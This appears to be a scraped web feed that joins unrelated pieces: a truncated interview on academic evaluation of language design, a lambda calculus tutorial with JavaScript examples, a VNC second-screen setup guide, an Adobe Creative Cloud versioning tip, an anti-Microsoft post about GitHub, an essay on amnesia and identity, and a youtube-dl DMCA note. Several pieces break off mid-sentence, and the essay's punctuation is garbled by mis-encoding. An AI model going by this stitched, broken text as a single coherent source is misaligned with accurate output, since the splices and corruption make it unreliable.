<p>You know, there are two ways of handling design problems. One is, you can solve them in the market, right? You can, you know, go off and have people go and design programming languages and see which are successful, and we have that down. There’s a whole system for doing that. And then there’s an academic equivalent of this, and a lot of the work on OCaml, in particular, happens in a context which includes a lot of academic staff. Do you have a feel for how you would make things like evaluation of papers different than it is now in order to accommodate for this?</p>

<h2 id="0007335">00:07:33.5</h2>

<div><p>I don’t have concrete suggestions. I’ve always wanted to, actually seriously, look into disciplines like architecture and so on, and look at how they, I mean they have journals. They have assessment of things. There must be mechanisms by which they do this, but I’ve never actually sat down and put serious time into seeing what that is. </p><p> I’m kind of more struck by the fact that when you’re at, say ICFP, which is the main functional …</p></div></div></div>

    <p>I have recently become very interested in functional programming - using pure functional languages such as Haskell, as well as functional programming in JavaScript. One of the main areas of study that is often cited as significant for functional programmers is <strong>lambda calculus</strong>.</p>

<p>In this article I want to look at what lambda calculus is, why you might want to learn about it, and explain the key concepts and the terminology of lambda calculus using both lambda syntax and ‘equivalent’ JavaScript code snippets.</p>

<p>If after reading this you are interested in learning more about functional programming in JavaScript, I recommend this Udemy course (affiliate link):</p>

<p><a href="https://click.linksynergy.com/link?id=5FPU6FRy5w4&amp;offerid=507388.1537962&amp;type=2&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Ffunctional-programming-for-beginners-with-javascript%2F">Functional Programming For Beginners With JavaScript</a></p>



<p>There are a few reasons to learn lambda calculus, the main ones I can think of are:</p>

<ol>
  <li>
    <p><strong>It embodies some of the most important concepts of functional programming</strong></p>

    <p>For example, pure functions, unary functions, currying.</p>
  </li>
  <li>
    <p><strong>The internals of many functional programming languages such as Haskell, are heavily based on lambda calculus</strong></p>

    <p>Understanding lambda calculus will help you to understand these languages.</p>
  </li>
  <li>
    <p><strong>Many concepts from lambda calculus are applicable to general purpose languages such as JavaScript.</strong></p>

    <p>Concepts such as pure functions, unary functions and currying are used in many general purpose programming languages, and are often used in functional JavaScript.</p>
  </li>
  <li>
    <p><strong>It is interesting</strong></p>

    <p>Lambda calculus is an interesting area of mathematics, and is relatively accessible to those with a minimal maths background.</p>
  </li>
</ol>



<p>Lambda calculus was invented by the mathematician <a href="https://en.wikipedia.org/wiki/Alonzo_Church">Alonzo Church</a> in the 1930s, and is what is known as a ‘computational model’. By that, I mean that it is a system which can be used to encode and compute algorithmic problems.</p>

<p>The computational model most of us are familiar with is the Turing machine. While lambda calculus is rather different to the Turing machine in its approach to computation, the two are formally equivalent - ie. any problem that can by solved using a Turing machine can be solved using lambda calculus, and vice versa.</p>

<p>That is to say, lambda calculus can be used to solve any problem that can be computed using a Turing machine (so anything that anyone has ever programmed with a computer)!</p>
<h2 id="lambda-calculus-basics">Lambda calculus basics</h2>

<p>Lambda calculus is very minimalistic in its rules/axioms. It is made up of just 3 basic components, or <strong>lambda terms</strong>:</p>

<ol>
  <li>
    <p><strong>Variable</strong> - a named token used in a function, which will be replaced by concrete arguments when the function is applied.</p>
  </li>
  <li>
    <p><strong>Abstraction</strong> - a function, made up of a head and a body separated by a ‘\(.\)’</p>

    <ul>
      <li>The head is a lambda followed by a variable name.</li>
      <li>The body is an expression.</li>
    </ul>
  </li>
  <li>
    <p><strong>Application</strong> - a function invokation.</p>
  </li>
</ol>

<p>An <strong>expression</strong> is a variable, an abstraction, an application, or any combination of these.</p>

<p>In addition, parentheses are used in lambda calculus to indicate the order of evaluation.</p>

<p>This is all we get in lambda calculus! It is quite amazing that using these 3 lambda terms we calculate pretty much anything!</p>

<p>It is worth noting the absence of any of the constructs of basic arithmetic, such as numbers, addition, subtraction, multiplication, division etc - these are not within the basic axioms of lambda calculus.</p>

<p>Numbers and arithmetic operations can be defined in terms of lambda calculus via <a href="https://en.wikipedia.org/wiki/Church_encoding">Church Encoding</a> (which is outside the scope of this article). Rather than working from first principles every time we need them, we can choose to use numbers and basic arithmetic operators for convenience.</p>

<h2 id="a-simple-example---the-identity-function">A simple example - the identity function</h2>

<p>The following function is known as the identity function, it takes a value and returns that same value.</p>

<p>In JavaScript we can easily define and execute this function:</p>

<pre><code>const identity = x =&gt; x;
identity(3) // 3
</code></pre>

<p>We can write the same function using lambda calculus as follows:</p><p>

\[\lambda x . x\]

</p><p>In the above:</p>
<ul>
  <li>\(x\) is a variable.</li>
  <li>
    <p>\(\lambda x . x\) is an abstraction.</p>

    <ul>
      <li>\(\lambda x\) is the head of the abstraction</li>
      <li>\(x\) is the body of the abstraction.</li>
    </ul>
  </li>
</ul>

<p>To perform an application, ie. apply the function to a concrete argument, we use the following syntax:</p><p>

\[(\lambda x . x) \ 3\]

\[[x := 3]\]

\[3\]

</p><p>In the above, the \([x := 3]\) syntax indicates that we are going to substitute all instances of \(x\) in the function with \(3\). The above process is known as beta reduction, which I will talk more about now.</p>

<h2 id="beta-reduction">Beta reduction</h2>

<p>In JavaScript when we invoke a (pure) function with its arguments, the function gets evaluated and it returns the evaluated result:</p>

<pre><code>const f = (x, y) =&gt; x(y);

f(z =&gt; z + 1, 3); // 4
</code></pre>

<p>Here, <code>f</code> takes 2 arguments - a function <code>x</code> and a value <code>y</code>, and calls <code>x</code> with <code>y</code> as an argument.</p>

<p>In lambda calculus, the process of applying concrete arguments to an abstraction, and reducing the resulting expression is known as <strong>beta reduction</strong>.</p>

<p>The equivalent to the above JavaScript function <code>f</code>, when written with lambda calculus, is:</p><p>

\[\lambda x y . x y\]

</p><p>This time, we have an application in the body of the abstraction: \(x y\), this means ‘call \(x\) with \(y\) as an argument’. We can pass arguments to the abstraction and beta reduce it as follows:</p><p>

\[(\lambda x y . x y) \ (\lambda z . z + 1) \ 3\]

\[[x := \lambda z . z + 1]\]

\[(\lambda y . (\lambda z . z + 1) \ y) \ 3\]

\[[z := y]\]

\[(\lambda y . y + 1) \ 3\]

\[[y := 3]\]

\[4\]

</p><p><strong>Beta normal form</strong> is the most simplified form of an expression, ie. when it cannot be beta reduced the terms in an expression any further. In the above example \(4\) is the beta normal form of the application.</p>

<h2 id="alpha-equivalence">Alpha Equivalence</h2>

<p>In JavaScript, renaming a function’s parameters has no effect on the behaviour of the function.</p>

<pre><code>// The following are equivalent.
const myFunc1 = (x, y) =&gt; x * x;
const myFunc2 = (y, x) =&gt; y * y;
</code></pre>

<p>Similarly, in lambda calculus renaming variables within a function also has no effect. We say that abstractions which differ only in their variable names are <strong>alpha equivalent</strong>.</p>

<p>The following is an example of 2 abstractions which are alpha equivalent:</p><p>

\[\lambda x y . xx\]

\[\lambda y x . yy\]

</p><h2 id="bound-and-free-variables">Bound and free variables</h2>

<p>In JavaScript, the return value of a function can be calculated us both its parameters, and variables which the function closes over:</p>

<pre><code>const z = 5;
// z, in the context of our function, is a free variable.
const f = (x, y) =&gt; z + (x * y);

f(2, 3); // 11 === z + 6
</code></pre>

<p>Similarly, lambda calculus abstractions can make use of both variables which are defined in the head of the abstraction, and other, ‘unknown’ variables which are not. In lambda calculus:</p>

<ul>
  <li><strong>Bound variables</strong> are variables used in an abstraction which appear in the head of the abstraction.</li>
  <li><strong>Free variables</strong> are variables used in an abstraction which do not appear in the head, their value is taken to be unknown within the context of the abstraction.</li>
</ul>

<p>If we express the JavaScript function defined above in lambda calculus, we get:</p><p>

\[\lambda x y . z + (x * y)\]

</p><p>And now applying arguments to this function and beta reducing it:</p><p>

\[(\lambda x y . z + (x * y)) \ 2 \ 3\]

\[[x := 2]\]

\[(\lambda y . z + (2 * y)) \ 3\]

\[[y := 3]\]

\[z + 6\]

</p><p>The notable difference here is that in our JavaScript function, we assigned a value to <code>z</code>, whereas in the lambda calculus, we just evaluated the function as far as we could without knowing \(z\).</p>

<p>Even though it is not a numerical result, \(z + 6\) is the beta normal form of this application.</p>

<h2 id="unary-functions-and-currying">Unary functions and currying</h2>

<p>Up until now we have been making a simplification, and viewing lambda functions as functions which take one or more arguments and return a single value.</p>

<p>This is <em>not actually correct</em>.</p>

<p>Every lambda function takes a single argument and returns a single result, and this type of function is know as a <strong>unary function</strong>.</p><p>

\[\lambda x y z . x * y * z\]

</p><p>Is actually shorthand for</p><p>

\[\lambda x . (\lambda y .  (\lambda z . x * y * z))\]

</p><p>This is function with a single parameter \(x\), which when invoked returns another function with a single parameter \(y\), which when invoked returns another function with a single parameter \(z\), which when invoked returns the value of \(x * y * z\)</p>

<p>In JavaScript, the above function looks like:</p>

<pre><code>const f = x =&gt; y =&gt; z =&gt; x * y * z;
</code></pre>

<p>If you have done any functional programming in JavaScript then this way of writing a function may look familiar. Taking a function which takes many arguments, and breaking it down into a series of unary functions (which each take a single argument) is known as <strong>currying</strong>.</p>

<p>We can invoke the above function either by passing all of its arguments and immediately obtaining the final result, or, we can first create a more specific function by passing only some arguments, and then call this function later to get the final result.</p>

<pre><code>// Call our function with 3 arguments.
f(2)(3)(4); // 24

// Call our function with 2 arguments to create a more specialised function.
const multiplyBySix = f(2)(3);

multiplyBySix(4); // 24
</code></pre>

<p>In JavaScript we have the choice to either use curried unary functions, or functions which take more than one argument.</p>

<p>In lambda calculus, all functions are curried unary functions, despite that fact that we often use the aforementioned shorthand which makes them appear as if they take multiple arguments.</p>



<p>Just as not all JavaScript function calls can be evaluated to produce a value, not all lambda functions reduce to a beta normal form upon application. Consider the following, somewhat contrived piece of JavaScript:</p>

<pre><code>const f = x =&gt; x(x);
f(f);
</code></pre>

<p>This is a little confusing. We define a function <code>f</code>, which takes a function <code>x</code> and calls it with itself as an argument. On the next line, we call <code>f</code> with itself, which will recursively continue to call f with itself, and mayhem ensues.</p>

<p>If you execute the above code, you will get a max call stack size exceeded error. Conceptually we can think of what happens as something like:</p>

<pre><code>f(f(f(f(f(f(...)))))); // and so on, until we reach the maximum call stack size.
</code></pre>

<p>In lambda …</p></div></div>

<div><p>A few people have asked recently what exactly is going on inside the PN junction. What concretely is happening?

October 23, 2020 | https://rgoswami.me/posts/laptop-as-second-screens/ | <a href="https://web.archive.org/web/*/https://rgoswami.me/posts/laptop-as-second-screens/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Dual screen workflows without screens across operating systems</p></blockquote><h2 id="background">Background</h2><p>My X380 sadly has been having port issues. This meant that my M14 was no longer a viable option for my second screen needs.</p><h2 id="outline">Outline</h2><p>The general form of the solution works in one of two ways:</p><dl><dt>VNC Viewer</dt><dd>Where the (second-screen) laptop connects to a VNC server on the primary laptop</dd><dt>Peripheral Shares</dt><dd>Where the secondary laptop runs a server to enable proxying mouse and keyboard access from the primary laptop</dd></dl><h2 id="vnc-and-windows">VNC and Windows</h2><p>For laptops running Windows, I personally just set up <a href="https://tightvnc.com/">TightVNC</a>. The standard settings work well enough for the peripheral share described below.</p><p>This is best used for working with Windows only stuff like Office.</p><h2 id="vnc-and-linux">VNC and Linux</h2><p>For the secondary laptop we need to run a server (<code>tigervnc</code>) without setting an external screen.</p><div><pre><code data-lang="bash">x0vncserver -rfbauth ~/.vnc/passwd
</code></pre></div><p>Now on the main laptop, we will simply leverage <code>x2vnc</code> to extend into the secondary laptop.</p><p>Where we can get the IP (local) by checking with <code>ifconfig</code> on the secondary laptop.</p><h4 id="meta">Meta</h4><p>This works best when combined with a networked file-system, since then you can interact with files in tandem. Otherwise, there is quite a bit of <code>git</code> based back and forth.</p><h2 id="vnc-and-android">VNC and Android</h2><p>There are two parts to this solution. Note that, as Android devices don’t run X11 systems in a meaningful way, the direct access method is through a paid application, a2vnc server lite, which also did not work well in my tests. We will therefore focus on setting a VNC viewer up to connect to the primary laptop.</p><h3 id="primary-settings">Primary Settings</h3><h4 id="xrandr-setup">XRandR Setup</h4><p>For the primary laptop, we will start by obtaining our present screens configuration.</p><div><pre><code data-lang="bash">xrandr <span>|</span> grep <span>" connected"</span>
</code></pre></div><div><pre><code data-lang="bash">eDP1 connected primary 1920x1080+1920+0 <span>(</span>normal left inverted right x axis y axis<span>)</span> 290mm x 170mm
</code></pre></div><p>Naturally your output will differ. We also need the resolution of the Android device. In my case, they are the same. At this point we are ready to figure out the mode-line.</p><div><pre><code data-lang="bash"><span># 1920x1080 @ 60.00 Hz (GTF) hsync: 67.08 kHz; pclk: 172.80 MHz</span>
Modeline <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Let us now use this information to create a bunch of modelines.</p><div><pre><code data-lang="bash">xrandr --newmode <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Note that we can create more of these in the same manner. We can now move forward with making a virtual screen.</p><div><pre><code data-lang="bash">xrandr --addmode VIRTUAL1 1920x1080_60.00
</code></pre></div><p>We can now finally set up the output.</p><div><pre><code data-lang="bash">xrandr --output VIRTUAL1 --mode 1920x1080_60.00 --left-of eDP1
</code></pre></div><p>Note that it is better to use <code>mons</code> to work with our newly created virtual screen.</p><p>This is still a bit ugly, since the process needs to be repeated with each reboot.</p><h4 id="vnc-setup">VNC Setup</h4><p>Now we need prepare our VNC. <code>x11vnc</code> is recommended at the moment.</p><div><pre><code data-lang="bash">x11vnc -vencrypt nodh:only-ssl -ssl SAVE -clip 1920x1080+0+0
</code></pre></div><h3 id="android-settings">Android Settings</h3><p>For this section, I personally use <a href="https://play.google.com/store/apps/details?id=com.iiordanov.bVNC&amp;hl=en&amp;gl=US">bVNC Pro</a>. The setup is pretty dead simple. A basic VNC connection is all that is required.</p><p>In practice, I use the x86 setup, with the secondary laptop acting as a viewer for a virtual screen, mostly because that way I can tune into multiple Zoom meetings (a bonus).</p><h2 id="conclusion">Conclusion</h2><p>The final setup is quite robust to changes. Future posts might go into setting up the kind of local networking tools to help move files, code and more between both machines, to improve on the peripheral share approach. Additionally, there are still some manual steps which can and should be automated. I’m not super pleased with the setup, it takes longer than a wireless screen. This post is complimented by the <a href="https://rgoswami.me/posts/multi-monitor-touch/">work and setup with touchscreens here</a>.</p></div></div>]]>

<p><span>What is the trick? On install,<strong> uncheck “Remove old versions”</strong>. That’s it! And you’ll keep your older versions of InDesign (or Photoshop, or whatever).</span></p>
<p><span><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_UpdateRemoveOld.gif" alt="Install updates without removing old versions of Adobe CC apps" width="480" height="270"></span></p>
<p><span>You can also enable auto-update and tell it to keep your old versions.</span></p>
<p><span><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_PreferencesRemoveOld.gif" alt="Change Preferences for Adobe CC apps to auto-update but not remove old versions" width="480" height="270"></span></p>
<h3><span>How do I get back a previous version of an Adobe CC application that was unintentionally removed?</span></h3>
<p><span>This option is a little less hidden than it has been in the past. It really is quite simple:</span></p>
<p><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_OtherVersions.gif" alt="Install previous Adobe app versions with the Other Versions option" width="480" height="270"></p>


<p><span>With the recent release of Adobe CC 2021, we’ve fielded the same questions that we received with previous Creative Cloud updates. Three main questions arise:</span></p>
<ol>
<li>Why would I want to keep a previous version of Adobe CC apps (such as InDesign) around?</li>
<li>How do I keep previous versions of an Adobe CC application as I install the new one?</li>
<li>How do I install a previous version of an Adobe CC application when I find it was unintentionally removed?</li>
</ol>
<h3>Why might I want to keep previous versions of Adobe CC applications (such as InDesign) around?</h3>
<p>Out with the old, in with the new, right? In this age of phones and app stores, software moves at a much faster pace than traditional PC applications, especially those in the world of print and serious graphics. The average App Store application has a lifespan of one month, and “auto-update” is all the rage among web browsers, phone apps, even PC applications. Plus, with the modern subscription paradigm, as embraced by Adobe these days, upgrading is FREE! It is also free to keep older versions.</p>
<p>Sure, you can take the plunge, easily, but there may be reasons to pause and consider, “should I kill the old version while moving to the new?” I think the reality is that users should install the new CC 20XX version when available. Yet, in most cases, <strong>it is a best practice to keep the older version as well.</strong></p>
<h4>Why might I want to keep the previous version of CC around?</h4>
<p>There are at least two reasons you may wish to keep CC 2019 on your computer while you install CC 2020:</p>
<ol>
<li>You have validated production workflows in CC 2019 and <strong>haven’t yet tested</strong> these in CC 2020.</li>
<li>Your workflow includes <strong>third-party plugins that don’t yet work with CC 2020. </strong>In most cases, it takes anywhere from a few days to a few months for third-party developers to update their plugins to the new CC version.</li>
</ol>
<h4>You don’t need to choose between CC 2020 and CC 2021!</h4>
<p>As far as Adobe software goes, the upgrade decision doesn’t need to be either/or between the new and previous version. This seems to be a very common mis-conception. <strong>Versions of InDesign and other CC apps co-exist quite nicely.&nbsp;</strong>This has been the case from time immemorial. It has always been an option to <strong>add</strong> the new version <strong>without removing</strong> the older version.</p>
<p>You might think this is a Boolean decision – just one version or the other – because CC apps by default will remove old versions on install. But no, <strong>it is easy to choose to keep the previous version</strong> (though this would be the default, in an ideal world) if you know how to do it.</p>
<p><span>Please&nbsp;<a href="mailto:maxdunn@siliconpublishing.com" rel=" noopener">email us</a> if you can’t figure out how to put back a previous version, or if you have questions about maintaining multiple versions of Creative Cloud applications.</span></p>

<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generation don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub, but of course I also have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of important Open Source code reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture so many things are turned into "crap"? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><strong>When you wake</strong> up in the morning, how do you know who you are? You might say something like: â€˜Because I remember.â€™ A perfectly good answer, and one with a venerable history. The English philosopher John Locke, for example, considered memory to be the foundation of identity. â€˜Consciousness always accompanies thinking,â€™ he wrote in 1694. â€˜And as far as this consciousness can be extended backwards to any past Action or Thought, so far reaches the Identity of that <em>Person</em>.â€™</p>
<p>For most of us, the question of where identity comes from doesnâ€™t have much bearing on day-to-day life. We donâ€™t have to <em>try</em> to remember who we are; it just happens. But for the <a href="https://www.thelancet.com/pdfs/journals/laneur/PIIS1474-4422(18)30444-7.pdf" rel="nofollow noreferrer noopener">growing</a> number of people who survive brain injury every year, it can be a different story. If you survive an accident or an illness that limits your ability to form new memories, leaving you with whatâ€™s called â€˜anterograde amnesiaâ€™, you might be forced to look elsewhere for your sense of self.</p>
<p>Over the past 15 years working at Headway East London, the UK-based brain injury charity, Iâ€™ve met many people for whom anterograde amnesia has been the cause of profound existential <a href="https://aeon.co/essays/matthew-had-a-brain-injury-who-is-he-after-brain-surgery" rel="noopener">change</a>. Sadie, a paediatric nurse and mother of two who survived a stroke. Gretha, a city worker who fell ill with an infection. Henry, a greengrocer who suffered heart failure during a violent assault, his brain starved of oxygen. They have all recovered well from a medical perspective but, because of amnesia, they find new conscious memories difficult â€“ or impossible â€“ to form. As a result, they live with great uncertainty and disorientation, not to mention dramatic restrictions on their day-to-day freedoms.</p>
<p>The ability to form new memories underpins almost all aspects of personal and professional responsibility. Sadie, Gretha and Henry all became unemployed after their brain injuries, and lost many of the connections and roles that gave meaning to their pre-amnesia lives. Both Sadie and Gretha were forced to move home to live with elderly parents, Henry to sheltered accommodation. When they arenâ€™t at home or at Headwayâ€™s centre, all three of them are shadowed every minute of the day by support workers.</p>
<p>The adjustment to amnesia can take a punishing psychological toll. Sadie, for example, lived with terrible anxiety for several years after her stoke. I remember how, as her frustration and panic peaked, she would fly into rages, often targeted at her blameless support worker. In the absence of any conscious recollection of what had led up to these furies, Sadie was at a loss to explain or contextualise them. It seemed to me that, as in a nightmare, she knew only that she didnâ€™t know what was going on.</p>
<p>This is a frightening lesson about what it means to live without the ability to form the conscious thought-memory described by Locke, what psychologists now term â€˜autobiographicalâ€™ memory. Recollecting recent events <a href="https://pubmed.ncbi.nlm.nih.gov/25685356/" rel="nofollow noreferrer noopener">allows</a> a person to orient themselves, ground their sense of identity and maintain a narrative thread that coherently places them in the world.</p>
<p>They have all found new ways to stabilise and feed their sense of self through action</p>
<p>But I want to caution against the idea, intimated by Locke, that the ongoing formation of conscious memory is the same thing as identity. Despite their often-bewildering conditions, every amnesia survivor I know is a distinct, vivid human being â€“ they each have an inimitable character and a strong sense of self. What is it, in the absence of recent memories, that allows them to know who they are?</p>
<p><strong>Many survivors have</strong> significant memories of their pre-injury lives, formed before amnesia set in, and these old memories can help anchor their identities. Sadieâ€™s relationship with her children, for example, is still hugely important to her. But, at the same time, Henry barely ever refers to his life before injury, and some <a href="http://whoareyounow.org/story/nifty" rel="nofollow noreferrer noopener">survivors</a> I know prefer to forget who they used to be. Even when pre-injury memories do play a role, Iâ€™m convinced that few survivors rely on them alone. Instead, Gretha, Sadie and Henry have all found new ways to stabilise and feed their sense of self through action: through habits and roles that allow them to keep growing and learning.</p>
<p>Since his injury, Henry has built a career as an artist. Though his conscious memories of this inevitably fade, he gravitates to the art studio with an unerring reliability, drawn back there by the positive feelings his work produces in him. A couple of years ago he was asked to design a badge for Headway members to wear at an exhibition opening event. It read â€˜ARTISTâ€™. He kept his copy and wears it frequently, though I believe he now has no conscious memory of the event it was made for.</p>
<p>Gretha speaks eloquently about how her own drawing practice, which she started at Headway, helps to orient her: â€˜I know my own handiwork. I know who I am. Itâ€™s not always strong but itâ€™s always me.â€™ She also speaks of its positive influence on her mood, an influence that works even in the absence of conscious recollection: â€˜Iâ€™m happier when Iâ€™ve been in the art studio even if I canâ€™t remember Iâ€™ve been there. Itâ€™s like, even if you havenâ€™t got the Champagne glass in your hand anymore, but you drank the Champagne, do you not feel pissed after?â€™</p>
<p>When Sadie sings during the music sessions at the centre, demonstrating her astonishing range and word-perfect recall of Motown classics, it can feel strange to know how profound her amnesia is outside this context. I also remember a day when one of the staff at Headway brought in her newborn baby to visit. On seeing them, Sadie dropped out of the excitable, somewhat distractible mode that often occupies her at the centre and calmly took the baby in her arms. She cradled the newborn with assurance while asking the mother acute, sensitive questions about its health and sleeping habits.</p>
<p>Sadie has a rich memory of her life before the injury, including her years as a paediatric nurse. The encounter with the baby surely evoked both the â€˜skillsâ€™ associated with that time, or what researchers would <a href="https://pubmed.ncbi.nlm.nih.gov/15037131/" rel="nofollow noreferrer noopener">call</a> â€˜proceduralâ€™ memories, as well as the explicit, autobiographical ones. But I think the experience was more than the sum of these parts; she hadnâ€™t simply reverted to the past. For a moment, and perhaps for the first time since her injury, Sadie was the most centred person in the room: oriented not just to the child in her arms and to the adults around her but to her own identity. I was watching her in the throes of a whole-person, embodied memory: a moment that unified her historical expertise, unconscious physical habits and consciously remembered experiences with her present intentions, bodily sensations and deeply felt emotion. I only wish I had asked her, in that moment, how she felt.</p>
<p>Amnesia survivors are most themselves in contexts that continually reinforce their embodied tendencies</p>
<p><strong>The observation Iâ€™m</strong> trying to make is that personhood isnâ€™t the sole property of the mind, or of the brain, or of any one function of these entities. Personhood is a property of the <em>whole body,</em> and the whole body is implicated in how both personhood and an individual <em>person</em> can persist in the face of perpetual forgetting.</p>
<p>It was reading a blog <a href="https://philosophyofbrains.com/2016/11/15/memory-and-the-self-rilkean-memory.aspx" rel="nofollow noreferrer noopener">post</a> by the philosopher Mark Rowlands, discussing his idea of â€˜Rilkean memoryâ€™, that finally gave me language for this hitherto unspoken intuition. Rowlands chose the name because of something that the poet Rainer Maria Rilke wrote in 1910 about how poetry emerges from memories:</p>
<blockquote>â€¦ memories themselves are not important. Only when they have changed into our very blood, into glance and gesture, and are nameless, no longer to be distinguished from ourselves â€“ only then can it happen that in some very rare hour the first word of a poem arises in their midst and goes forth from them.</blockquote>
<p>Unlike Lockean autobiographical memory, which is a property of conscious thinking alone, Rilkean memory lives in the action of the whole body, arising from the â€˜behavioural dispositionâ€™ or â€˜enduring moodâ€™ thatâ€™s left behind when conscious, narrative memory fades away. When persistent and entrenched enough, Rowlands <a href="https://philosophyofbrains.com/2016/11/16/memory-and-the-self-the-style-of-a-person.aspx" rel="nofollow noreferrer noopener">says</a>, these dispositions and moods become an â€˜existential styleâ€™, a way of being that can hold a person together in the face of â€˜catastrophic memory lossâ€™.</p>
<p>This is what I see in brain injury survivors such as Henry, Gretha and Sadie. When they take part in practices that mean something to them, they become absorbed in living truths that remind them who they are. Amnesia survivors, who have lost the conscious memory-formation so vulnerable to brain injury, are most themselves in contexts that continually reinforce their embodied tendencies, their bodily dispositions and feelings. The places where they are most confident in their identities are the ones in which they are supported not merely to think but to <em>do</em> the things they love. To support these survivors, we must take seriously the idea of whole-body, whole-person memory, and look for ways to reinforce it, wherever we can.</p>
<p>When I wake up each morning, there are things I recognise as part of â€˜meâ€™. The aura of dream is replaced almost immediately by a continuity of thought from the previous day. And behind this are layers of familiar sensation: the dryness of my skin; the exaggerated sensitivity of my hands; the way my eyes want to hide from the daylight; the empty feeling of my typical morning hunger; and the bodily restlessness that will soon get me out of bed. Words are there even before I realise it, and I feel a pang of regret as I break the silence. Then I look at my partner, stirring next to me, and recognise another whole domain of identity: the people I share my life with and the feelings they bring to life. Itâ€™s a cascade of embodiment, of tendency, of self, that emerges. Doubtless, if I survived a brain injury, some of these things might change or disappear. But not all of them.</p></div></div></div>]]>

		<p>GitHub has removed the ability to access youtube-dl's source code due to a DMCA.</p>

		<p>On the 23rd of October, GitHub received a <a href="https://github.com/github/dmca/blob/master/2020/10/2020-10-23-RIAA.md">DMCA</a> against the youtube-dl authors, claiming the software infringed copyright Laws. While I fundamentally disagree with this, let's talk more about it.</p>
<p>First off, it should go without saying that this source code needs to be held elsewhere, outside of the control of GitHub or GitLab. We've seen an increasing amount of <a href="https://github.com/github/dmca/tree/master/2020/10">Cease and Desist</a> notices being sent to GitHub, with a staggering 124 (!) in October of 2020.</p>
<p>Secondly, copyright claims such as these are harmful to genuine software development. While these claims do hold some truth, some say it is fundamentally <em>unjust</em> to prevent access to an educational source code repository.</p>
